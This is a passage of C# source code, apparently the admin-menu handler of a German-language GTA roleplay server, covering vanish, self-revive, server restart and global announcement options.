                        }
                    }
                    finally
                    {
                        mySqlReaderCon.Connection.Dispose();
                    }
                }
                catch (Exception ex)
                {
                    Logger.Print("[EXCEPTION ADUTY] " + ex.Message);
                    Logger.Print("[EXCEPTION ADUTY] " + ex.StackTrace);
                }
            }
            else if (selection == "vanish")
            {

                Client client = dbPlayer.Client;

                if (!client.HasSharedData("PLAYER_INVISIBLE"))
                    return;

                bool invisible = client.GetSharedData("PLAYER_INVISIBLE");
                dbPlayer.SendNotification("Du hast dich " + (!invisible ? "unsichtbar" : "sichtbar") + " gemacht.", "black", 3500, "ADMIN");
                client.SetSharedData("PLAYER_INVISIBLE", !invisible);

            }
            else if (selection == "revivemenu")
            {
                if (adminranks.Permission <= 91)
                    return;

                if (dbPlayer == null || !dbPlayer.IsValid(true))
                    return;

                Client client = dbPlayer.Client;

                dbPlayer.SpawnPlayer(dbPlayer.Client.Position);
                dbPlayer.disableAllPlayerActions(false);
                dbPlayer.SetAttribute("Death", 0);
                dbPlayer.StopAnimation();
                dbPlayer.SetInvincible(false);
                dbPlayer.DeathData = new DeathData
                {
                    IsDead = false,
                    DeathTime = new DateTime(0)
                };
                dbPlayer.TriggerEvent("toggleBlurred", false);

                dbPlayer.SendNotification("Du hast dich selber revived!", "black", 3500, "Support");
                WebhookSender.SendMessage("Spieler hat sich selber revived", "Der Spieler " + dbPlayer.Name + " hat sich selber revived!", Webhooks.revivelogs, "Revive");
            }
            else if (selection == "restart")
            {
                Environment.Exit(0);
            }
            else if (selection == "restartannounce")
            {
                Notification.SendGlobalNotification("Der Server startet nun automatisch neu.", 8000, "#0972c1", Notification.icon.warn);
            }
            else if (selection == "voicepflicht")
            {
                Notification.SendGlobalNotification("Es herrscht Voice Pflicht! TS: Purity-Crimelife", 8000, "white", Notification.icon.warn);
            }
            else if (selection == "teamspeak")
            {
                Notification.SendGlobalNotification("TS: Vision-Crimelife", 10000, "white", Notification.icon.warn);
            }
 #region
 #endregion
        }
    }
}